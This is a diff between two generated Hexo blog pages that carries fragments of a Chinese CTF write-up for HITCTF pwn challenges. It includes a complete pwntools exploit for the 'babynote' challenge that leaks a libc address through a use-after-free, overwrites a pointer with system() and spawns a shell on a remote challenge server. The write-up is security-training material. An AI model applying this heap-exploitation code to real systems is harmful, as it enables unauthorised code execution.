@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="pwn," />
+  <meta name="keywords" content="Hexo, NexT" />
 
 
 
@@ -79,48 +79,13 @@
 
 
 
-<meta name="description" content="STACK OVERFLOW基本逻辑main函数调用vuln函数，vuln函数中输入name字符串：  漏洞vuln函数中buf的地址是ebp-28h，即buf大小为0x28，但在读入字符串时，read参数是0x40，即栈溢出漏洞。 漏洞利用保护机制： NX堆栈不可执行  在IDA的函数一栏发现有一个flag的函数，利用该函数执行shell ：  通过栈溢出构造ROP：将vuln函数返回地址覆盖为">
-<meta name="keywords" content="pwn">
-<meta property="og:type" content="article">
-<meta property="og:title" content="HITCTF PWN">
-<meta property="og:url" content="http://yoursite.com/2018/02/07/HITCTF-PWN/index.html">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://yoursite.com/page/2/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="STACK OVERFLOW基本逻辑main函数调用vuln函数，vuln函数中输入name字符串：  漏洞vuln函数中buf的地址是ebp-28h，即buf大小为0x28，但在读入字符串时，read参数是0x40，即栈溢出漏洞。 漏洞利用保护机制： NX堆栈不可执行  在IDA的函数一栏发现有一个flag的函数，利用该函数执行shell ：  通过栈溢出构造ROP：将vuln函数返回地址覆盖为">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://yoursite.com/2018/02/07/HITCTF-PWN/stackoverflow_1.png">
-<meta property="og:image" content="http://yoursite.com/2018/02/07/HITCTF-PWN/stackoverflow_2.png">
-<meta property="og:image" content="http://yoursite.com/2018/02/07/HITCTF-PWN/stackoverflow_3.png">
-<meta property="og:image" content="http://yoursite.com/2018/02/07/HITCTF-PWN/login_1.png">
-<meta property="og:image" content="http://yoursite.com/2018/02/07/HITCTF-PWN/login_2.png">
-<meta property="og:image" content="http://yoursite.com/2018/02/07/HITCTF-PWN/login_3.png">
-<meta property="og:image" content="http://yoursite.com/2018/02/07/HITCTF-PWN/dragonball_1.png">
-<meta property="og:image" content="http://yoursite.com/2018/02/07/HITCTF-PWN/dragonball_2.png">
-<meta property="og:image" content="http://yoursite.com/2018/02/07/HITCTF-PWN/dragonball_3.png">
-<meta property="og:image" content="http://yoursite.com/2018/02/07/HITCTF-PWN/dragonball_4.png">
-<meta property="og:image" content="http://yoursite.com/2018/02/07/HITCTF-PWN/dragonball_5.png">
-<meta property="og:image" content="http://yoursite.com/2018/02/07/HITCTF-PWN/dragonball_6.png">
-<meta property="og:image" content="http://yoursite.com/2018/02/07/HITCTF-PWN/nodes_1.png">
-<meta property="og:image" content="http://yoursite.com/2018/02/07/HITCTF-PWN/nodes_2.png">
-<meta property="og:image" content="http://yoursite.com/2018/02/07/HITCTF-PWN/nodes_3.png">
-<meta property="og:image" content="http://yoursite.com/2018/02/07/HITCTF-PWN/nodes_4.png">
-<meta property="og:image" content="http://yoursite.com/2018/02/07/HITCTF-PWN/nodes_5.png">
-<meta property="og:image" content="http://yoursite.com/2018/02/07/HITCTF-PWN/nodes_6.png">
-<meta property="og:image" content="http://yoursite.com/2018/02/07/HITCTF-PWN/nodes_7.png">
-<meta property="og:image" content="http://yoursite.com/2018/02/07/HITCTF-PWN/babynote_1.png">
-<meta property="og:image" content="http://yoursite.com/2018/02/07/HITCTF-PWN/babynote_2.png">
-<meta property="og:image" content="http://yoursite.com/2018/02/07/HITCTF-PWN/babynote_3.png">
-<meta property="og:image" content="http://yoursite.com/2018/02/07/HITCTF-PWN/babynote_4.png">
-<meta property="og:image" content="http://yoursite.com/2018/02/07/HITCTF-PWN/babynote_5.png">
-<meta property="og:image" content="http://yoursite.com/2018/02/07/HITCTF-PWN/babynote_6.png">
-<meta property="og:image" content="http://yoursite.com/2018/02/07/HITCTF-PWN/babynote_7.png">
-<meta property="og:image" content="http://yoursite.com/2018/02/07/HITCTF-PWN/babynote_9.jpg">
-<meta property="og:image" content="http://yoursite.com/2018/02/07/HITCTF-PWN/babynote_8.jpg">
-<meta property="og:image" content="http://yoursite.com/2018/02/07/HITCTF-PWN/babynote_10.png">
-<meta property="og:updated_time" content="2018-06-27T14:03:10.672Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="HITCTF PWN">
-<meta name="twitter:description" content="STACK OVERFLOW基本逻辑main函数调用vuln函数，vuln函数中输入name字符串：  漏洞vuln函数中buf的地址是ebp-28h，即buf大小为0x28，但在读入字符串时，read参数是0x40，即栈溢出漏洞。 漏洞利用保护机制： NX堆栈不可执行  在IDA的函数一栏发现有一个flag的函数，利用该函数执行shell ：  通过栈溢出构造ROP：将vuln函数返回地址覆盖为">
-<meta name="twitter:image" content="http://yoursite.com/2018/02/07/HITCTF-PWN/stackoverflow_1.png">
+<meta name="twitter:title" content="Hexo">
 
 
 
@@ -150,13 +115,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2018/02/07/HITCTF-PWN/"/>
+  <link rel="canonical" href="http://yoursite.com/page/2/"/>
 
 
 
 
 
-  <title>HITCTF PWN | Hexo</title>
+  <title>Hexo</title>
   
 
 
@@ -175,7 +140,8 @@
     
   
 
-  <div class="container sidebar-position-left page-post-detail">
+  <div class="container sidebar-position-left 
+  page-home">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -248,9 +214,9 @@
         <div class="content-wrap">
           <div id="content" class="content">
             
-
-  <div id="posts" class="posts-expand">
+  <section id="posts" class="posts-expand">
     
+      
 
   
 
@@ -280,7 +246,9 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">HITCTF PWN</h1>
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/02/07/HITCTF-PWN/" itemprop="url">HITCTF PWN</a></h1>
         
 
         <div class="post-meta">
@@ -330,7 +298,9 @@
       
 
       
-        <h2 id="STACK-OVERFLOW"><a href="#STACK-OVERFLOW" class="headerlink" title="STACK OVERFLOW"></a>STACK OVERFLOW</h2><h3 id="基本逻辑"><a href="#基本逻辑" class="headerlink" title="基本逻辑"></a>基本逻辑</h3><p>main函数调用vuln函数，vuln函数中输入name字符串：</p>
+        
+          
+            <h2 id="STACK-OVERFLOW"><a href="#STACK-OVERFLOW" class="headerlink" title="STACK OVERFLOW"></a>STACK OVERFLOW</h2><h3 id="基本逻辑"><a href="#基本逻辑" class="headerlink" title="基本逻辑"></a>基本逻辑</h3><p>main函数调用vuln函数，vuln函数中输入name字符串：</p>
 <p><img src="/2018/02/07/HITCTF-PWN/stackoverflow_1.png" alt="vuln函数"></p>
 <h3 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h3><p>vuln函数中buf的地址是ebp-28h，即buf大小为0x28，但在读入字符串时，read参数是0x40，即栈溢出漏洞。</p>
 <h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>保护机制： NX堆栈不可执行</p>
@@ -417,6 +387,8 @@
 <p>PS:在调试过程中可以通过vmmap来查看，FD指针与libc其实地址的相对偏移offset。</p>
 <h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">	p = process(<span class="string">'./babynote'</span>)</span><br><span class="line">	libc = ELF(<span class="string">'./libc.local.so'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(<span class="string">'111.230.132.82'</span>,<span class="number">40004</span>)</span><br><span class="line">	libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line">offset = <span class="number">0x1b27b0</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Your choice :"</span>)</span><br><span class="line">	p.sendline(<span class="string">'1'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Content size:"</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">"Input the content:"</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Your choice :"</span>)</span><br><span class="line">	p.sendline(<span class="string">'4'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Input the index:"</span>)	</span><br><span class="line">	p.sendline(str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Your choice :"</span>)</span><br><span class="line">	p.sendline(<span class="string">'2'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Input the index:"</span>)	</span><br><span class="line">	p.sendline(str(index))</span><br><span class="line">	p.recvuntil(<span class="string">"New content:"</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">prints</span><span class="params">(index)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Your choice :"</span>)</span><br><span class="line">	p.sendline(<span class="string">'3'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Input the index:"</span>)	</span><br><span class="line">	p.sendline(str(index))</span><br><span class="line"><span class="comment">#0</span></span><br><span class="line">add(<span class="number">100</span>,<span class="string">'a'</span>*<span class="number">4</span>)</span><br><span class="line"><span class="comment">#1</span></span><br><span class="line">add(<span class="number">12</span>,<span class="string">'/bin/sh'</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">prints(<span class="number">1</span>)</span><br><span class="line">prints(<span class="number">0</span>)</span><br><span class="line">addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"addr:0x%x"</span> %addr</span><br><span class="line">libc_base = addr - offset</span><br><span class="line">sys_addr = libc_base+libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"sys:0x%x"</span>%sys_addr</span><br><span class="line"></span><br><span class="line"><span class="comment">#2</span></span><br><span class="line">add(<span class="number">12</span>,<span class="string">'c'</span>*<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,<span class="string">'/bin/sh\0'</span>+p32(sys_addr))</span><br><span class="line"></span><br><span class="line">prints(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
+          
+        
       
     </div>
     
@@ -431,36 +403,14 @@
 
     <footer class="post-footer">
       
-        <div class="post-tags">
-          
-            <a href="/tags/pwn/" rel="tag"># pwn</a>
-          
-        </div>
+
+      
+
       
 
       
       
-      
-
-      
-        <div class="post-nav">
-          <div class="post-nav-next post-nav-item">
-            
-          </div>
-
-          <span class="post-nav-divider"></span>
-
-          <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/03/08/pwnable-tw-hacknote/" rel="prev" title="pwnable.tw--hacknote">
-                pwnable.tw--hacknote <i class="fa fa-chevron-right"></i>
-              </a>
-            
-          </div>
-        </div>
-      
-
-      
+        <div class="post-eof"></div>
       
     </footer>
   </div>
@@ -470,11 +420,14 @@
   </article>
 
 
+    
+  </section>
 
-    <div class="post-spread">
-      
-    </div>
-  </div>
+  
+  <nav class="pagination">
+    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
+  </nav>
+
 
 
           </div>
@@ -482,10 +435,6 @@
 
 
           
-
-  
-
-
 
         </div>
         
@@ -506,17 +455,8 @@
       
 
       
-        <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
-            文章目录
-          </li>
-          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
-            站点概览
-          </li>
-        </ul>
-      
 
-      <section class="site-overview-wrap sidebar-panel">
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -567,22 +507,6 @@
         </div>
       </section>
 
-      
-      <!--noindex-->
-        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
-          <div class="post-toc">
-
-            
-              
-            
-
-            
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#STACK-OVERFLOW"><span class="nav-number">1.</span> <span class="nav-text">STACK OVERFLOW</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#基本逻辑"><span class="nav-number">1.1.</span> <span class="nav-text">基本逻辑</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞"><span class="nav-number">1.2.</span> <span class="nav-text">漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞利用"><span class="nav-number">1.3.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp"><span class="nav-number">1.4.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#login"><span class="nav-number">2.</span> <span class="nav-text">login</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#基本逻辑-1"><span class="nav-number">2.1.</span> <span class="nav-text">基本逻辑</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞-1"><span class="nav-number">2.2.</span> <span class="nav-text">漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞利用-1"><span class="nav-number">2.3.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-1"><span class="nav-number">2.4.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DragonBall"><span class="nav-number">3.</span> <span class="nav-text">DragonBall</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#基本逻辑-2"><span class="nav-number">3.1.</span> <span class="nav-text">基本逻辑</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞-2"><span class="nav-number">3.2.</span> <span class="nav-text">漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞利用-2"><span class="nav-number">3.3.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-2"><span class="nav-number">3.4.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#nodes"><span class="nav-number">4.</span> <span class="nav-text">nodes</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#基本逻辑-3"><span class="nav-number">4.1.</span> <span class="nav-text">基本逻辑</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞-3"><span class="nav-number">4.2.</span> <span class="nav-text">漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞利用-3"><span class="nav-number">4.3.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-3"><span class="nav-number">4.4.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#babynote"><span class="nav-number">5.</span> <span class="nav-text">babynote</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#基本逻辑-4"><span class="nav-number">5.1.</span> <span class="nav-text">基本逻辑</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞-4"><span class="nav-number">5.2.</span> <span class="nav-text">漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞利用-4"><span class="nav-number">5.3.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-4"><span class="nav-number">5.4.</span> <span class="nav-text">exp</span></a></li></ol></li></ol></div>
-            
-
-          </div>
-        </section>
-      <!--/noindex-->
       
 
       
@@ -716,10 +640,6 @@
   
 
   
-  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
-<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
-
-
 
   
 
